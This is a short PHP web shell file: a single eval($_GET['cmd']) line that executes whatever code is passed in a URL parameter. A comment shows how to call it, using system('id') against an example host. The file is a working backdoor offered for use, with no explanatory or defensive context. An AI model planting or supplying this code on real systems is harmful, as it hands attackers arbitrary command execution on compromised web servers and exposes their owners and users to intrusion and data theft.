# This will only work if the eval() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_eval.php?cmd=system('id');

<?php eval($_GET['cmd']); ?>